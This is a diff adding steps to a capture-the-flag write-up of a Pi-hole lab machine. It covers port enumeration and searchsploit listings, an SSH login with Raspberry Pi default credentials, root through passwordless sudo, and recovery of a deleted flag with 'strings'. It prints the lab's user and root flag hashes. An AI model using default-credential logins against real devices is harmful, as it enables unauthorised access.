@@ -6,6 +6,10 @@
 
 ### 2. Port 80 HTTP Enumeration
 
+### 3. Port 1075 UPNP Enumeration
+
+### 4. 
+
 # Attack
 ## 1. NMAP
 Insert TEXT.. ?
@@ -77,7 +81,7 @@ This page is blocked because it is explicitly contained within the following blo
 Go back Whitelist this page Close window
 Generated Sat 10:10 AM, Feb 06 by Pi-hole v3.1.4
 ```
-At least this is progress! 
+At least this is progress! We know there is a `Pi-hole v3.1.4` running.
 
 Time for some GoBuster!
 ```
@@ -121,7 +125,205 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ```
 Interesting, two directories, `/admin` & `/versions`.
 
-Let's visit `http://10.129.92.103/admin` first.
+Let's visit `http://10.129.92.103/admin` first. It is a Pi-hole admin console page.
 ```
+Pi-hole
+
+Status
+Active
+Load:  0  0.04  0.04
+Memory usage:  39.7 %
+
+    MAIN NAVIGATION
+    Dashboard
+    Login
+    Donate
+
+Queries over last 24 hours
+Pi-hole Version v3.1.4 Web Interface Version v3.1 FTL Version v2.10
+Donate if you found this useful.
 ```
-Next to `http://10.129.92.103/versions`.
+Nothing interesting here, except the Login page. Let's visit that.
+```
+Pi-hole
+
+Sign in to start your session
+
+    Return → Log in and go to requested page (login)
+    Ctrl+Return → Log in and go to Settings page
+
+
+Forgot password
+Pi-hole Version v3.1.4 Web Interface Version v3.1 FTL Version v2.10
+Donate if you found this useful.
+```
+Interesting. However, the password for the dashboard web interface is randomized and there isn't a default password we could try. We will have to look into this again.
+
+Next to `http://10.129.92.103/versions`. Navigating here prompts us to download a file, `application/octet-stream (13 bytes)`. In the file which we downloaded, we see a weird string. What's this cryptic shit?
+```
+1616248250,,,
+```
+
+## 3. Port 1075 UPNP Enumeration
+Unfortunately, we were not able to get a response from `10.129.92.103:1075`.
+
+Since we were at this stage, let's do a `searchsploit platinum upnp`. We didn't get any useful results.
+```
+hippoeug@kali:~$ searchsploit platinum upnp
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                                                      |  Path
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Genexis Platinum 4410 Router 2.1 - UPnP Credential Exposure                                                                         | hardware/remote/49075.py
+Platinum SDK Library - POST UPnP 'sscanf' Buffer Overflow (PoC)                                                                     | multiple/dos/15346.c
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+```
+
+We also try searching for the Pi-hole version which we saw earlier.
+```
+hippoeug@kali:~$ searchsploit pi-hole
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                                                      |  Path
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Pi-Hole - heisenbergCompensator Blocklist OS Command Execution (Metasploit)                                                         | php/remote/48491.rb
+Pi-hole 4.3.2 - Remote Code Execution (Authenticated)                                                                               | python/webapps/48727.py
+Pi-hole 4.4.0 - Remote Code Execution (Authenticated)                                                                               | linux/webapps/48519.py
+Pi-hole < 4.4 - Authenticated Remote Code Execution                                                                                 | linux/webapps/48442.py
+Pi-hole < 4.4 - Authenticated Remote Code Execution / Privileges Escalation                                                         | linux/webapps/48443.py
+Pi-Hole Web Interface 2.8.1 - Persistent Cross-Site Scripting in Whitelist/Blacklist                                                | linux/webapps/40249.txt
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+```
+However, from my understanding, these exploits require authentication into the admin panel etc to be able to exploit. Needa look elsewhere.
+
+## 4. Port 22 SSH Enumeration
+Since we have not found any passwords thus far, let's just try a default Pi-hole password. From Google, we found `username:pi` and `password:raspberry` for SSH.
+```
+hippoeug@kali:~$ ssh pi@10.129.116.150
+The authenticity of host '10.129.116.150 (10.129.116.150)' can't be established.
+ECDSA key fingerprint is SHA256:UkDz3Z1kWt2O5g2GRlullQ3UY/cVIx/oXtiqLPXiXMY.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.129.116.150' (ECDSA) to the list of known hosts.
+pi@10.129.116.150's password: 
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Aug 27 14:47:50 2017 from localhost
+
+SSH is enabled and the default password for the 'pi' user has not been changed.
+This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.
+
+
+SSH is enabled and the default password for the 'pi' user has not been changed.
+This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.
+
+pi@raspberrypi:~ $ 
+```
+Ooh, just like that? 
+
+## 5. Getting Flags
+Let's find the first flag.
+```
+pi@raspberrypi:~/Desktop $ ls
+Plex  user.txt
+pi@raspberrypi:~/Desktop $ cat user.txt
+ff837707441b257a20e32199d7c8838d
+```
+And the root flag. But first we need to switch to root.
+```
+pi@raspberrypi:/ $ sudo -l
+Matching Defaults entries for pi on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User pi may run the following commands on localhost:
+    (ALL : ALL) ALL
+    (ALL) NOPASSWD: ALL
+    
+pi@raspberrypi:/ $ sudo id
+uid=0(root) gid=0(root) groups=0(root)
+
+pi@raspberrypi:/ $ su root
+Password: 
+root@raspberrypi:/# 
+```
+We're root now.
+```
+root@raspberrypi:/# ls
+bin   dev  home        initrd.img.old  lost+found  mnt  persistence.conf  root  sbin  sys  usr  vmlinuz
+boot  etc  initrd.img  lib             media       opt  proc              run   srv   tmp  var  vmlinuz.old
+root@raspberrypi:/# cd root
+root@raspberrypi:~# ls
+root.txt
+root@raspberrypi:~# cat root.txt
+I lost my original root.txt! I think I may have a backup on my USB stick...
+```
+Ooh, this is special.
+
+Let's look for the USB deevice.
+```
+root@raspberrypi:/# df -h
+Filesystem      Size  Used Avail Use% Mounted on
+aufs            8.5G  2.8G  5.3G  34% /
+tmpfs           100M  4.8M   96M   5% /run
+/dev/sda1       1.3G  1.3G     0 100% /lib/live/mount/persistence/sda1
+/dev/loop0      1.3G  1.3G     0 100% /lib/live/mount/rootfs/filesystem.squashfs
+tmpfs           250M     0  250M   0% /lib/live/mount/overlay
+/dev/sda2       8.5G  2.8G  5.3G  34% /lib/live/mount/persistence/sda2
+devtmpfs         10M     0   10M   0% /dev
+tmpfs           250M  8.0K  250M   1% /dev/shm
+tmpfs           5.0M  4.0K  5.0M   1% /run/lock
+tmpfs           250M     0  250M   0% /sys/fs/cgroup
+tmpfs           250M  8.0K  250M   1% /tmp
+/dev/sdb        8.7M   93K  7.9M   2% /media/usbstick
+tmpfs            50M     0   50M   0% /run/user/999
+tmpfs            50M     0   50M   0% /run/user/1000
+root@raspberrypi:/# cd /media/usbstick
+root@raspberrypi:/media/usbstick# ls
+damnit.txt  lost+found
+root@raspberrypi:/media/usbstick# cat damnit.txt
+Damnit! Sorry man I accidentally deleted your files off the USB stick.
+Do you know if there is any way to get them back?
+
+-James
+root@raspberrypi:/media/usbstick# ls -la
+total 18
+drwxr-xr-x 3 root root  1024 Aug 14  2017 .
+drwxr-xr-x 3 root root  4096 Aug 14  2017 ..
+-rw-r--r-- 1 root root   129 Aug 14  2017 damnit.txt
+drwx------ 2 root root 12288 Aug 14  2017 lost+found
+root@raspberrypi:/media/usbstick# cd lost+found
+root@raspberrypi:/media/usbstick/lost+found# ls
+```
+Unforunately, we didn't find anything here and I got stuck here. Needed to look for some hints.
+
+Turns out, all we needed to do was to string it as the file did exist at one point, it is safe to assume the data may still be in the image.
+```
+root@raspberrypi:/media/usbstick# strings /dev/sdb
+>r &
+/media/usbstick
+lost+found
+root.txt
+damnit.txt
+>r &
+>r &
+/media/usbstick
+lost+found
+root.txt
+damnit.txt
+>r &
+/media/usbstick
+2]8^
+lost+found
+root.txt
+damnit.txt
+>r &
+3d3e483143ff12ec505d026fa13e020b
+Damnit! Sorry man I accidentally deleted your files off the USB stick.
+Do you know if there is any way to get them back?
+-James
+```
+And we found the root flag within!
